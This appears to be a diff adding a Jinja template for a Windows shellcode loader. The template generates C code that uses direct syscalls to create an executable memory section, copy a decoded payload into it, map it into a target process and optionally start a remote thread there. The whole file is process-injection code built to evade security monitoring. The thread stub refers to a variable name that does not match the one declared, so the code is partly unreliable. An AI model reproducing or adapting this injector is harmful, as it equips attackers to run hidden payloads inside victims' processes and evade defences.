@@ -1,0 +1,39 @@
+{% if section == "globals" %}
+    {% include "lib/syscalls.jinja" %}
+
+    // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
+    typedef enum _SECTION_INHERIT {
+            ViewShare = 1,
+            ViewUnmap = 2
+    } SECTION_INHERIT, *PSECTION_INHERIT;
+
+    void *alloc(HANDLE hSelfProc, HANDLE hTargetProc, void *decoded, SIZE_T length){
+        NTSTATUS status;
+        DWORD SyscallId = 0;
+        HANDLE hSection = NULL;
+        PVOID pLocalSectionView = NULL;
+        PVOID pRemoteSectionView = NULL;
+
+        {{ syscall_call("NtCreateSection", "&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &length, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL") }}
+        {{ syscall_call("NtMapViewOfSection", "hSection, hSelfProc, &pLocalSectionView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_READWRITE") }}
+
+        memcpy(pLocalSectionView, decoded, length);
+
+        {% if stub is defined and not stub and stub.yaml_tag != "!modifier.CreateThreadStub" %}
+            {{ syscall_call("NtUnmapViewOfSection", "hSelfProc, pLocalSectionView") }}
+        {% endif %}
+
+        {% if protection.value == "rx" %}
+            {{ syscall_call("NtMapViewOfSection", "hSection, hTargetProc, &pRemoteSectionView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_EXECUTE_READ") }}
+        {% else %}
+            {{ syscall_call("NtMapViewOfSection", "hSection, hTargetProc, &pRemoteSectionView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE") }}
+        {% endif %}
+
+        {% if stub and stub.yaml_tag == "!modifier.CreateThreadStub" %}
+            {{ createThreadStub("mem", "pRemoteView") }}
+            {{ syscall_call("NtUnmapViewOfSection", "hSelfProc, pLocalSectionView") }}
+        {% endif %}
+
+        return pRemoteSectionView;
+    }
+{% endif %}
